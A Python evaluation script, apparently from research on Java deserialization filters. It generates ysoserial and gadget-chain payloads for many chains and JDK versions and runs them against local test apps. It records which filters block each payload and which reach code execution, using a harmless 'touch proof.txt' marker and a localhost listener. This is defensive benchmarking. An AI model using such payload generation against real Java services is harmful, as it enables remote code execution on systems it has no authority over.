import socket
import subprocess
import os
import shutil
import threading
import time

YSOSERIAL = "ysoserial.jar"
GADGETBUILDER_1 = "gadgetbuilder-1.jar"
GADGETBUILDER_2 = "gadgetbuilder-2.jar"
TESTAPP = "testapp.jar"

ysoserial_command_dict = {
    "touch proof.txt": ["BeanShell1", "Click1", "Clojure", "CommonsBeanutils1", "CommonsCollections1",
                        "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5",
                        "CommonsCollections6", "CommonsCollections7", "Groovy1", "Hibernate1", "JBossInterceptors1",
                        "JSON1", "JavassistWeld1", "MozillaRhino1", "MozillaRhino2", "ROME", "Spring1", "Spring2",
                        "Vaadin1" ],
    "http://localhost:8000/:main.RemoteClass" : ["C3P0", "Myfaces2"],
    "rmi://localhost:8000/service" : ["Hibernate2"],
    "proof.txt;cHJvb2Y=" : ["AspectJWeaver"],
    "write;ysoserial;proof" : ["FileUpload1", "Wicket1"],
    "/tmp/jython1.py;/tmp/jython_new.py" : ["Jython1"],
    "http://randomDomain.org": ["URLDNS"],
    "localhost:8000" : ["JRMPClient"],
    "8000" : ["JRMPListener"]
}



def get_jdk_path(version : int, subversion :int = -1) -> str:
    if version == 8:
        return "/home/jvm/oracle/8/jdk1.8.0_381"

    if subversion == -1:
        subversion = version

    return f"/home/jvm/openjdk/{version}/jdk-{subversion}"


def get_jdk_paths(base_path = os.path.join("/home/jvm/openjdk")):

    all_jdks = []

    for dir in os.listdir(base_path):
        dir_path = os.path.join(base_path, dir)
        if not os.path.isdir(dir_path): continue
        for subdir in os.listdir(dir_path):
            all_jdks.append(os.path.join(dir_path, subdir))

    print(f"[INFO] {len(all_jdks)} JDK paths found")
    return all_jdks


def build_testapps():

    compile_dir = "testapps"
    if not os.path.exists(compile_dir):
        os.mkdir(compile_dir)

    for jdk in get_jdk_paths():
        javac_bin = os.path.join(jdk, "bin", "javac")
        jar_bin = os.path.join(jdk, "bin", "jar")
        subprocess.run([javac_bin, "TestAppSimple.java"], stdout=subprocess.DEVNULL)
        subprocess.run([jar_bin, "--create", "--file", os.path.join(compile_dir, f"{os.path.split(jdk)[-1]}.jar"), "TestAppSimple.class"], stdout=subprocess.DEVNULL)


def socket_listener(host='0.0.0.0', port=8000):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[Socket Listener] Listening on {host}:{port}...")

    try:
        while True:
            client_socket, address = server_socket.accept()
            with open("proof.txt", "w") as f:
                pass
            client_socket.close()
    except Exception as e:
        print(f"[Socket Listener] Error: {e}")
    finally:
        server_socket.close()



MethodInvoke_GCs = ["CommonsBeanutils1", "CommonsCollections2", "CommonsCollections4",
                    "CommonsCollections8", "Hibernate1", "MozillaRhino2", "Ceylon", "Click1", "JBossInterceptors1",
                    "JavassistWeld1", "ROME", "ROME2"]

ToString_GCs = ["CommonsCollections5", "CommonsCollections9", "MozillaRhino1", "Vaadin1", "Atomikos"]

def run_testapps():

    if not os.path.exists("cp.txt"):
        subprocess.run(["mvn", "dependency:build-classpath", "-Dmdep.outputFile=../eval/cp.txt"], cwd=os.path.join("..", "testapp"))

    classpath = open("cp2.txt", "r").read()

    listener = threading.Thread(target=socket_listener, daemon=True)
    listener.start()

    for payload in ["Clojure1"]:

        success_rate = 0
        print(f"-------{payload}--------")

        for jdk in get_jdk_paths():
            java_bin = os.path.join(jdk, "bin", "java")
            payload_dir = os.path.join("gadgetbuilder", os.path.split(jdk)[-1], payload)

            for pfile in os.listdir(payload_dir):
                payload_file = os.path.join(payload_dir, pfile)

                if os.path.exists("proof.txt"):
                    os.remove("proof.txt")

                proc = subprocess.Popen([java_bin, "-cp", f"{classpath}:./testapps/{os.path.split(jdk)[-1]}.jar", "TestAppSimple", payload_file], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                time.sleep(3)
                proc.kill()

                if (os.path.exists("proof.txt")):
                    print("Success: " + os.path.split(jdk)[-1] + " " + pfile)
                    success_rate += 1
                    break

        print("Success_Cnt: " + str(success_rate))


def create_payloads():

    if not os.path.exists("ysoserial"):
        os.mkdir("ysoserial")
    if not os.path.exists("gadgetbuilder"):
        os.mkdir("gadgetbuilder")

    java_path = get_jdk_path(9) + "/bin/java"

    for command in ysoserial_command_dict:
        for payload in ysoserial_command_dict[command]:
                subprocess.run(java_path + " -jar " + YSOSERIAL + " " + payload + " '" + command + "' " +  "> " + f"ysoserial/{payload}.ser", shell=True)

    return


def exec_ysoserial():
    java_path = get_jdk_path(9) + "/bin/java"

    filter_dict = {"rce": {}}

    for file in os.listdir("ysoserial"):
        if not ".ser" in file:
            continue

        payload_name = file.replace(".ser", "")

        if "JRMPListener" not in file: continue

        print(f"------{file}-------")
        proc = subprocess.Popen([java_path, "-cp", TESTAPP, "org.ses.testapp.Main", f"ysoserial/{file}"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

        while proc.poll() is None:
            line = proc.stdout.readline().replace("\n", "")
            if line.strip() == '' : continue
            print(line)
            filter_name = line.split(":")[0]
            filter_status = line.split(":")[1].strip()

            if filter_status == "BLOCKED":
                if not filter_name in filter_dict:
                    filter_dict[filter_name] = 0
                filter_dict[filter_name] += 1

            if filter_status == "EXEC" and payload_name in ysoserial_command_dict["touch proof.txt"]:
                if not filter_name in filter_dict["rce"]:
                    filter_dict["rce"][filter_name] = 0
                filter_dict["rce"][filter_name] += 1


    for filter_name in filter_dict:
        print(f"{filter_name} : {filter_dict[filter_name]}")


rce_chains = "BeanShell1 Clojure1 Clojure2 Clojure4 Clojure5 CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7 CommonsCollections9 Groovy1 Groovy2 Jython1 Jython2 Jython3 Jython4 MozillaRhino3".split(" ")

def is_gadget_builder_rce_payload(chain, trampoline_and_adapter):

    adapter = trampoline_and_adapter.split("_")[-1].replace(".ser", "")
    if adapter == "TemplatesImplMethodInvokeAdapter" or adapter == "TemplatesImplInitializeAdapter":
        return True

    if chain in rce_chains:
        return True

    return False


def create_gadgetbuilder_payloads():

    outputdir = "gadgetbuilder"
    if not os.path.exists(outputdir):
        os.mkdir(outputdir)

    for jdk in get_jdk_paths():
        java_bin = os.path.join(jdk, "bin", "java")

        sub_dir = os.path.join(outputdir, f"{os.path.split(jdk)[-1]}")
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)

        print(sub_dir)

        subprocess.run([java_bin, "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                        "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                        "--add-opens=java.base/java.util=ALL-UNNAMED",
                        "--add-opens=java.base/java.util.concurrent=ALL-UNNAMED",
                        "--add-opens=java.management/javax.management=ALL-UNNAMED",
                        "--add-opens=java.base/java.lang=ALL-UNNAMED",
                        "--add-opens=java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED",
                        "--add-opens=java.sql.rowset/com.sun.rowset=ALL-UNNAMED",
                        "--add-opens=java.base/java.net=ALL-UNNAMED",
                        "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
                        "--add-opens=java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED",
                        "-cp", GADGETBUILDER_1, "org.ses.gadgetbuilder.client.ChainGenUtil", sub_dir])


def exec_gadgetbuilder():
    java_path = get_jdk_path(9) + "/bin/java"
    filter_dict = {"rce": {}}

    for dir in os.listdir("gadgetbuilder"):
        dir_path = os.path.join("gadgetbuilder", dir)
        if not os.path.isdir(dir_path): continue

        chain_name = dir

        for file in os.listdir(dir_path):
            if not ".ser" in file:
                continue

            file_path = os.path.join(dir_path, file)

            if "JRMPListener" in file_path: continue

            print(f"------{file_path}-------")
            proc = subprocess.Popen([java_path, "-cp", TESTAPP, "org.ses.testapp.Main", file_path], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            while proc.poll() is None:
                line = proc.stdout.readline().replace("\n", "")
                if line.strip() == '' : continue
                print(line)
                filter_name = line.split(":")[0]
                filter_status = line.split(":")[1].strip()

                if filter_status == "BLOCKED":
                    if not filter_name in filter_dict:
                        filter_dict[filter_name] = 0
                    filter_dict[filter_name] += 1
                if filter_status == "EXEC" and is_gadget_builder_rce_payload(chain_name, file):
                    if not filter_name in filter_dict["rce"]:
                        filter_dict["rce"][filter_name] = 0
                    filter_dict["rce"][filter_name] += 1


    for filter_name in filter_dict:
        print(f"{filter_name} : {filter_dict[filter_name]}")

def main():
    #exec_gadgetbuilder()
    #build_testapps()
    run_testapps()
    #create_gadgetbuilder_payloads()
    return


if __name__ == '__main__':
    main()

